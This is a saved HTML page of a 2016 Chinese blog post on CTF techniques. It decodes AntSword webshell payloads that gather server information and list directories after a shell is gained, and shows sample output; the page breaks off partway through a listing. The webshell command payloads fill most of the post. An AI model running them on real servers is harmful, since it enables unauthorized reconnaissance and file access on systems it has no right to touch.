@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+
+<html lang="zh-Hans">
+<head>
+<!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+<meta charset="utf-8"/>
+<meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible">
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<meta content="telephone=no" name="format-detection">
+<meta content="LoRexxar" name="author"/>
+<meta content="前段时间打ctf的时候突然发现，有时候我们getshell了，但是由于服务器大部分时候回禁用shell函数，我们往往只能使用eval(),一般意义来说，我们可以通过菜刀蚁剑这样的工具，但是如果我们的shell是通过文件包含的方式成立的，工具经常没法用，突然一下用php函数读文件写文件还需要查查看，所以今天分析下蚁剑的列目录读文件方式，需要的时候可以直接来用" name="description"/>
+<meta content="article" property="og:type"/>
+<meta content="php webshell 各种函数" property="og:title"/>
+<meta content="http://lorexxar.cn/2016/05/12/php-shell/index.html" property="og:url"/>
+<meta content="LoRexxar's Blog" property="og:site_name"/>
+<meta content="前段时间打ctf的时候突然发现，有时候我们getshell了，但是由于服务器大部分时候回禁用shell函数，我们往往只能使用eval(),一般意义来说，我们可以通过菜刀蚁剑这样的工具，但是如果我们的shell是通过文件包含的方式成立的，工具经常没法用，突然一下用php函数读文件写文件还需要查查看，所以今天分析下蚁剑的列目录读文件方式，需要的时候可以直接来用" property="og:description"/>
+<meta content="2016-05-12T12:49:48.000Z" property="og:updated_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="php webshell 各种函数" name="twitter:title"/>
+<meta content="前段时间打ctf的时候突然发现，有时候我们getshell了，但是由于服务器大部分时候回禁用shell函数，我们往往只能使用eval(),一般意义来说，我们可以通过菜刀蚁剑这样的工具，但是如果我们的shell是通过文件包含的方式成立的，工具经常没法用，突然一下用php函数读文件写文件还需要查查看，所以今天分析下蚁剑的列目录读文件方式，需要的时候可以直接来用" name="twitter:description"/>
+<link href="./php webshell 各种函数  LoRexxar's Blog/apple-touch-icon.png" rel="apple-touch-icon"/>
+<link href="./php webshell 各种函数  LoRexxar's Blog/atom.xml" rel="alternate" title="LoRexxar's Blog" type="application/atom+xml"/>
+<link href="./php webshell 各种函数  LoRexxar's Blog/699-14040QPP9.jpg" rel="shortcut icon"/>
+<link href="./php webshell 各种函数  LoRexxar's Blog/jquery.fancybox.min.css" rel="stylesheet"/>
+<script src="./php webshell 各种函数  LoRexxar's Blog/pace.min.js"></script>
+<link href="./php webshell 各种函数  LoRexxar's Blog/pace-theme-minimal.css" rel="stylesheet"/>
+<link href="./php webshell 各种函数  LoRexxar's Blog/style.css" rel="stylesheet"/>
+<link href="./php webshell 各种函数  LoRexxar's Blog/font-awesome.min.css" rel="stylesheet"/>
+<title>php webshell 各种函数 | LoRexxar's Blog</title>
+<script src="./php webshell 各种函数  LoRexxar's Blog/jquery.min.js"></script>
+<script src="./php webshell 各种函数  LoRexxar's Blog/clipboard.min.js"></script>
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: false,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+<script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+<script> yiliaConfig.rootUrl = "\/";</script>
+<script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?736cd32ff67d23a009e16622fd600527";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+</meta></meta></head>
+<body>
+<div id="container">
+<div class="left-col">
+<div class="overlay"></div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="animated zoomIn" src="./php webshell 各种函数  LoRexxar's Blog/699-14040QPP9.jpg"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/">LoRexxar</a></h1>
+</hgroup>
+<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
+<form id="search-form">
+<input autocomplete="off" autocorrect="off" class="search form-control" id="local-search-input" name="q" placeholder="search..." searchonload="false" type="text"/>
+<i class="fa fa-times" onclick="resetSearch()"></i>
+</form>
+<div id="local-search-result"></div>
+<p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p>
+<div class="switch-btn" id="switch-btn">
+<div class="icon">
+<div class="icon-ctn">
+<div class="icon-wrap icon-house" data-idx="0">
+<div class="birdhouse"></div>
+<div class="birdhouse_holes"></div>
+</div>
+<div class="icon-wrap icon-ribbon hide" data-idx="1">
+<div class="ribbon"></div>
+</div>
+<div class="icon-wrap icon-link hide" data-idx="2">
+<div class="loopback_l"></div>
+<div class="loopback_r"></div>
+</div>
+<div class="icon-wrap icon-me hide" data-idx="3">
+<div class="user"></div>
+<div class="shoulder"></div>
+</div>
+</div>
+</div>
+<div class="tips-box hide">
+<div class="tips-arrow"></div>
+<ul class="tips-inner">
+<li>菜单</li>
+<li>标签</li>
+<li>友情链接</li>
+<li>关于我</li>
+</ul>
+</div>
+</div>
+<div class="switch-area" id="switch-area">
+<div class="switch-wrap">
+<section class="switch-part switch-part1">
+<nav class="header-menu">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="/archives/">所有文章</a></li>
+<li><a href="/tags/">标签云</a></li>
+<li><a href="/about/">关于我</a></li>
+</ul>
+</nav>
+<nav class="header-nav">
+<ul class="social">
+<a class="fa Email" href="/lorexxar@gmail.com" title="Email"></a>
+<a class="fa 新浪微博" href="/强行被换号的LoRexxar" title="新浪微博"></a>
+<a class="fa GitHub" href="https://github.com/LoRexxar" title="GitHub"></a>
+<a class="fa RSS" href="/atom.xml" title="RSS"></a>
+<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" title="知乎"></a>
+</ul>
+</nav>
+</section>
+<section class="switch-part switch-part2">
+<div class="widget tagcloud" id="js-tagcloud">
+<ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blogs/">Blogs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CBC/">CBC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essay/">Essay</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essry/">Essry</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IPC通道入侵/">IPC通道入侵</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LD-PRELOAD/">LD_PRELOAD</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reprint/">Reprint</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shadow-Brokers/">Shadow Brokers</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/access/">access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/book-notes/">book_notes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bookshelf/">bookshelf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cloudeye/">cloudeye</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cmd/">cmd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crontab/">crontab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csp/">csp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csrf/">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/curl/">curl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dns/">dns</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/eassy/">eassy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastcgi/">fastcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fcgi/">fcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/file-put-contents/">file_put_contents</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flask/">flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/game/">game</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gopher/">gopher</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hctf/">hctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/injection/">injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lcx端口转发/">lcx端口转发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lfi/">lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf/">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/opcache/">opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pdflatex/">pdflatex</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php-opcache/">php opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phpmailer/">phpmailer</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php伪协议/">php伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnhub/">pwnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rabins/">rabins</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sangebaimao/">sangebaimao</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/">sqli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-sock5/">ssh_sock5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/titan-souls/">titan_souls</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tqdm/">tqdm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virtualenv/">virtualenv</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic/">weblogic</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wget/">wget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/win-server信息收集/">win server信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/伪协议/">伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/参数污染/">参数污染</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/格式化字符串/">格式化字符串</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/模板注入/">模板注入</a></li></ul>
+</div>
+</section>
+<section class="switch-part switch-part3">
+<div id="js-friends">
+<a class="main-nav-link switch-friends-link" href="https://coding.net/u/LoRexxar">Coding</a>
+<a class="main-nav-link switch-friends-link" href="https://github.com/LoRexxar">GitHub</a>
+<a class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+<a class="main-nav-link switch-friends-link" href="https://wiki.hduisa.cn">HDUISA_wiki</a>
+<a class="main-nav-link switch-friends-link" href="https://lightless.me/">lightless</a>
+<a class="main-nav-link switch-friends-link" href="http://lazysheep.cc">Hcamael</a>
+<a class="main-nav-link switch-friends-link" href="http://aklis.info/">Aklis</a>
+<a class="main-nav-link switch-friends-link" href="http://libc.pw/">zh_explorer</a>
+<a class="main-nav-link switch-friends-link" href="http://edwardl.xyz/">Edward_L</a>
+<a class="main-nav-link switch-friends-link" href="http://evilddog.space/">evilddog</a>
+<a class="main-nav-link switch-friends-link" href="http://www.venenof.com/">Veneno</a>
+<a class="main-nav-link switch-friends-link" href="http://www.nohackair.net/">Airbasic</a>
+<a class="main-nav-link switch-friends-link" href="https://loli.be/">Mashiro</a>
+<a class="main-nav-link switch-friends-link" href="http://www.codersec.net/">bsmali4</a>
+<a class="main-nav-link switch-friends-link" href="/www.bertramc.cn">berTrAM</a>
+</div>
+</section>
+<section class="switch-part switch-part4">
+<div id="js-aboutme">带着对技术的敬畏之心成长，不安于一隅...</div>
+</section>
+</div>
+</div>
+</header>
+</div>
+</div>
+<div class="mid-col">
+<nav id="mobile-nav">
+<div class="overlay">
+<div class="slider-trigger"></div>
+<h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">LoRexxar</a></h1>
+</div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="animated zoomIn" src="./php webshell 各种函数  LoRexxar's Blog/699-14040QPP9.jpg"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/" title="回到主页">LoRexxar</a></h1>
+</hgroup>
+<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
+<nav class="header-menu">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="/archives/">所有文章</a></li>
+<li><a href="/tags/">标签云</a></li>
+<li><a href="/about/">关于我</a></li>
+<div class="clearfix"></div>
+</ul>
+</nav>
+<nav class="header-nav">
+<ul class="social">
+<a class="fa Email" href="/lorexxar@gmail.com" target="_blank" title="Email"></a>
+<a class="fa 新浪微博" href="/强行被换号的LoRexxar" target="_blank" title="新浪微博"></a>
+<a class="fa GitHub" href="https://github.com/LoRexxar" target="_blank" title="GitHub"></a>
+<a class="fa RSS" href="/atom.xml" target="_blank" title="RSS"></a>
+<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" target="_blank" title="知乎"></a>
+</ul>
+</nav>
+</header>
+</div>
+<link about="关于我" class="menu-list" friends="友情链接" tags="标签">
+</link></nav>
+<div class="body-wrap"><article class="article article-type-post" id="post-php-shell" itemprop="blogPost" itemscope="">
+<div class="article-meta">
+<a class="article-date" href="/2016/05/12/php-shell/">
+<time datetime="2016-05-12T12:04:02.000Z" itemprop="datePublished">2016-05-12</time>
+</a>
+</div>
+<div class="article-inner">
+<input class="isFancy" type="hidden"/>
+<header class="article-header">
+<h1 class="article-title" itemprop="name">
+      php webshell 各种函数
+    </h1>
+</header>
+<div class="article-info article-info-post">
+<div class="article-category tagcloud">
+<a class="article-category-link" href="/categories/Blogs/">Blogs</a>
+</div>
+<div class="article-tag tagcloud">
+<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Blogs/">Blogs</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/">php</a></li></ul>
+</div>
+<div class="clearfix"></div>
+</div>
+<div class="article-entry" itemprop="articleBody">
+<p>前段时间打ctf的时候突然发现，有时候我们getshell了，但是由于服务器大部分时候回禁用shell函数，我们往往只能使用eval(),一般意义来说，我们可以通过菜刀蚁剑这样的工具，但是如果我们的shell是通过文件包含的方式成立的，工具经常没法用，突然一下用php函数读文件写文件还需要查查看，所以今天分析下蚁剑的列目录读文件方式，需要的时候可以直接来用</p>
+<a id="more"></a>
+<p>我是通过分析蚁剑的语句来列出的，毕竟菜刀不支持php7</p>
+<h2 id="查看当前目录-amp-查看服务器信息"><a class="headerlink" href="#查看当前目录-amp-查看服务器信息" title="查看当前目录&amp;查看服务器信息"></a>查看当前目录&amp;查看服务器信息</h2><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="xml"></span><span class="perl">%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(<span class="number">0</span>)%3B%40set_magic_quotes_runtime(<span class="number">0</span>)%3Becho%20%22-%3D%3A%7B%22%3B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(<span class="keyword">substr</span>(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22A%22%2C%22Z%22)as%20%24L)<span class="keyword">if</span>(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3Becho%20%22%7D%3A%3D-%22%3Bdie()%3B</span><span class="xml"></span></div></pre></td></tr></table></figure>
+<p>整理下格式<br/><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</div><div class="line">@set_time_limit(<span class="number">0</span>);</div><div class="line">@set_magic_quotes_runtime(<span class="number">0</span>);</div><div class="line">echo <span class="string">"-=:{"</span>;</div><div class="line">$D=dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</div><div class="line"><span class="keyword">if</span>($D==<span class="string">""</span>)$D=dirname($_SERVER[<span class="string">"PATH_TRANSLATED"</span>]);</div><div class="line">$R=<span class="string">"{$D}	"</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">substr</span>($D,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">"/"</span>){</div><div class="line">	<span class="keyword">foreach</span>(range(<span class="string">"A"</span>,<span class="string">"Z"</span>)as $L)</div><div class="line">		<span class="keyword">if</span>(is_dir(<span class="string">"{$L}:"</span>))</div><div class="line">$R.=<span class="string">"{$L}:"</span>;</div><div class="line">}</div><div class="line"><span class="keyword">else</span>{</div><div class="line">$R.=<span class="string">"/"</span>;</div><div class="line">}</div><div class="line">$R.=<span class="string">"	"</span>;</div><div class="line">$u=(function_exists(<span class="string">"posix_getegid"</span>))?@posix_getpwuid(@posix_geteuid()):<span class="string">""</span>;</div><div class="line">$s=($u)?$u[<span class="string">"name"</span>]:@get_current_user();</div><div class="line">$R.=php_uname();</div><div class="line">$R.=<span class="string">"	{$s}"</span>;</div><div class="line">echo $R;;</div><div class="line">echo <span class="string">"}:=-"</span>;</div><div class="line"><span class="keyword">die</span>();</div></pre></td></tr></table></figure></p>
+<p>我们来看看返回<br/><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">=<span class="symbol">:</span>{<span class="regexp">/home/wwwroot</span><span class="regexp">/default	/</span>	Linux iZ285ei82c1Z <span class="number">3.13</span>.<span class="number">0</span>-<span class="number">32</span>-generic <span class="comment">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64	www}:=-</span></span></div></pre></td></tr></table></figure></p>
+<h2 id="列目录"><a class="headerlink" href="#列目录" title="列目录"></a>列目录</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">@<span class="keyword">ini_set</span>%<span class="keyword">28</span>%<span class="keyword">22display_errors</span>%<span class="keyword">22</span>%<span class="keyword">2C</span>%<span class="keyword">20</span>%<span class="keyword">220</span>%<span class="keyword">22</span>%<span class="keyword">29</span>%<span class="keyword">3B</span>@<span class="keyword">set_time_limit</span>%<span class="keyword">280</span>%<span class="keyword">29</span>%<span class="keyword">3B</span>@<span class="keyword">set_magic_quotes_runtime</span>%<span class="keyword">280</span>%<span class="keyword">29</span>%<span class="keyword">3Becho</span>%<span class="keyword">20</span>%<span class="keyword">22</span>-%<span class="keyword">3D</span>%<span class="keyword">3A</span>%<span class="keyword">7B</span>%<span class="keyword">22</span>%<span class="keyword">3B</span>%<span class="keyword">24D</span>%<span class="keyword">3Dbase64_decode</span>%<span class="keyword">28</span>%<span class="keyword">24_POST</span>%<span class="keyword">5B</span>%<span class="keyword">220xbad31815</span>%<span class="keyword">22</span>%<span class="keyword">5D</span>%<span class="keyword">29</span>%<span class="keyword">3B</span>%<span class="keyword">24F</span>%<span class="keyword">3D</span>@<span class="keyword">opendir</span>%<span class="keyword">28</span>%<span class="keyword">24D</span>%<span class="keyword">29</span>%<span class="keyword">3Bif</span>%<span class="keyword">28</span>%<span class="keyword">24F</span>%<span class="keyword">3D</span>%<span class="keyword">3DNULL</span>%<span class="keyword">29</span>%<span class="keyword">7Becho</span>%<span class="keyword">28</span>%<span class="keyword">22ERROR</span>%<span class="keyword">3A</span>%<span class="keyword">2f</span>%<span class="keyword">2f</span>%<span class="keyword">20Path</span>%<span class="keyword">20Not</span>%<span class="keyword">20Found</span>%<span class="keyword">20Or</span>%<span class="keyword">20No</span>%<span class="keyword">20Permission</span>%<span class="keyword">21</span>%<span class="keyword">22</span>%<span class="keyword">29</span>%<span class="keyword">3B</span>%<span class="keyword">7Delse</span>%<span class="keyword">7B</span>%<span class="keyword">24M</span>%<span class="keyword">3DNULL</span>%<span class="keyword">3B</span>%<span class="keyword">24L</span>%<span class="keyword">3DNULL</span>%<span class="keyword">3Bwhile</span>%<span class="keyword">28</span>%<span class="keyword">24N</span>%<span class="keyword">3D</span>@<span class="keyword">readdir</span>%<span class="keyword">28</span>%<span class="keyword">24F</span>%<span class="keyword">29</span>%<span class="keyword">29</span>%<span class="keyword">7B</span>%<span class="keyword">24P</span>%<span class="keyword">3D</span>%<span class="keyword">24D</span>.%<span class="keyword">22</span>%<span class="keyword">2f</span>%<span class="keyword">22</span>.%<span class="keyword">24N</span>%<span class="keyword">3B</span>%<span class="keyword">24T</span>%<span class="keyword">3D</span>@<span class="keyword">date</span>%<span class="keyword">28</span>%<span class="keyword">22Y</span>-<span class="keyword">m</span>-<span class="keyword">d</span>%<span class="keyword">20H</span>%<span class="keyword">3Ai</span>%<span class="keyword">3As</span>%<span class="keyword">22</span>%<span class="keyword">2C</span>@<span class="keyword">filemtime</span>%<span class="keyword">28</span>%<span class="keyword">24P</span>%<span class="keyword">29</span>%<span class="keyword">29</span>%<span class="keyword">3B</span>@%<span class="keyword">24E</span>%<span class="keyword">3Dsubstr</span>%<span class="keyword">28base_convert</span>%<span class="keyword">28</span>@<span class="keyword">fileperms</span>%<span class="keyword">28</span>%<span class="keyword">24P</span>%<span class="keyword">29</span>%<span class="keyword">2C10</span>%<span class="keyword">2C8</span>%<span class="keyword">29</span>%<span class="keyword">2C</span>-<span class="keyword">4</span>%<span class="keyword">29</span>%<span class="keyword">3B</span>%<span class="keyword">24R</span>%<span class="keyword">3D</span>%<span class="keyword">22</span>%<span class="keyword">09</span>%<span class="keyword">22</span>.%<span class="keyword">24T</span>.%<span class="keyword">22</span>%<span class="keyword">09</span>%<span class="keyword">22</span>.@<span class="keyword">filesize</span>%<span class="keyword">28</span>%<span class="keyword">24P</span>%<span class="keyword">29</span>.%<span class="keyword">22</span>%<span class="keyword">09</span>%<span class="keyword">22</span>.%<span class="keyword">24E</span>.%<span class="keyword">22</span>%<span class="keyword">0A</span>%<span class="keyword">22</span>%<span class="keyword">3Bif</span>%<span class="keyword">28</span>@<span class="keyword">is_dir</span>%<span class="keyword">28</span>%<span class="keyword">24P</span>%<span class="keyword">29</span>%<span class="keyword">29</span>%<span class="keyword">24M</span>.%<span class="keyword">3D</span>%<span class="keyword">24N</span>.%<span class="keyword">22</span>%<span class="keyword">2f</span>%<span class="keyword">22</span>.%<span class="keyword">24R</span>%<span class="keyword">3Belse</span>%<span class="keyword">20</span>%<span class="keyword">24L</span>.%<span class="keyword">3D</span>%<span class="keyword">24N</span>.%<span class="keyword">24R</span>%<span class="keyword">3B</span>%<span class="keyword">7Decho</span>%<span class="keyword">20</span>%<span class="keyword">24M</span>.%<span class="keyword">24L</span>%<span class="keyword">3B</span>@<span class="keyword">closedir</span>%<span class="keyword">28</span>%<span class="keyword">24F</span>%<span class="keyword">29</span>%<span class="keyword">3B</span>%<span class="keyword">7D</span>%<span class="keyword">3Becho</span>%<span class="keyword">20</span>%<span class="keyword">22</span>%<span class="keyword">7D</span>%<span class="keyword">3A</span>%<span class="keyword">3D</span>-%<span class="keyword">22</span>%<span class="keyword">3Bdie</span>%<span class="keyword">28</span>%<span class="keyword">29</span>%<span class="keyword">3B</span></div></pre></td></tr></table></figure>
+<p>修改下格式<br/><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">@ini_set</span>(<span class="string">"display_errors"</span>, <span class="string">"0"</span>)<span class="comment">;</span></div><div class="line"><span class="symbol">@set_time_limit</span>(<span class="number">0</span>)<span class="comment">;</span></div><div class="line"><span class="symbol">@set_magic_quotes_runtime</span>(<span class="number">0</span>)<span class="comment">;</span></div><div class="line">echo <span class="string">"-=:{"</span><span class="comment">;</span></div><div class="line">$D=base64_decode($_POST[<span class="string">"0xbad31815"</span>])<span class="comment">;</span></div><div class="line">$F=<span class="symbol">@opendir</span>($D)<span class="comment">;</span></div><div class="line"><span class="keyword">if</span>($F==<span class="literal">NULL</span>){</div><div class="line">	echo(<span class="string">"ERROR:// Path Not Found Or No Permission!"</span>)<span class="comment">;</span></div><div class="line">}</div><div class="line"><span class="keyword">else</span>{</div><div class="line">	$M=<span class="literal">NULL</span><span class="comment">;</span></div><div class="line">	$L=<span class="literal">NULL</span><span class="comment">;</span></div><div class="line">	<span class="keyword">while</span>($N=<span class="symbol">@readdir</span>($F)){</div><div class="line">		$P=$D.<span class="string">"/"</span>.$N<span class="comment">;</span></div><div class="line">		$T=<span class="symbol">@date</span>(<span class="string">"Y-m-d H:i:s"</span>,<span class="symbol">@filemtime</span>($P))<span class="comment">;</span></div><div class="line">		@$E=substr(base_convert(<span class="symbol">@fileperms</span>($P),<span class="number">10</span>,<span class="number">8</span>),<span class="number">-4</span>)<span class="comment">;</span></div><div class="line">		$R=<span class="string">"	"</span>.$T.<span class="string">"	"</span>.<span class="symbol">@filesize</span>($P).<span class="string">"	"</span>.$E.<span class="string">"</span></div><div class="line">		"<span class="comment">;</span></div><div class="line">	<span class="keyword">if</span>(<span class="symbol">@is_dir</span>($P))</div><div class="line">		$M.=$N.<span class="string">"/"</span>.$R<span class="comment">;</span></div><div class="line">	<span class="keyword">else</span> $L.=$N.$R<span class="comment">;</span></div><div class="line">	}</div><div class="line">	echo $M.$L<span class="comment">;</span></div><div class="line">	<span class="symbol">@closedir</span>($F)<span class="comment">;</span></div><div class="line">}<span class="comment">;</span></div><div class="line">echo <span class="string">"}:=-"</span><span class="comment">;</span></div><div class="line">die()<span class="comment">;</span></div></pre></td></tr></table></figure></p>
+<p>看看返回什么<br/><figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">-=:{aaaj7/	<span class="number">2016-04-20</span> <span class="number">23</span>:<span class="number">36:31	4096</span>	<span class="number">0755</span></div><div class="line">./	<span class="number">2016-05-12</span> <span class="number">19</span>:<span class="number">59:42	4096</span>	<span class="number">0755</span></div><div class="line">aaaj5/	<span class="number">2016-04-11</span> <span class="number">20</span>:<span class="number">19:09	4096</span>	<span 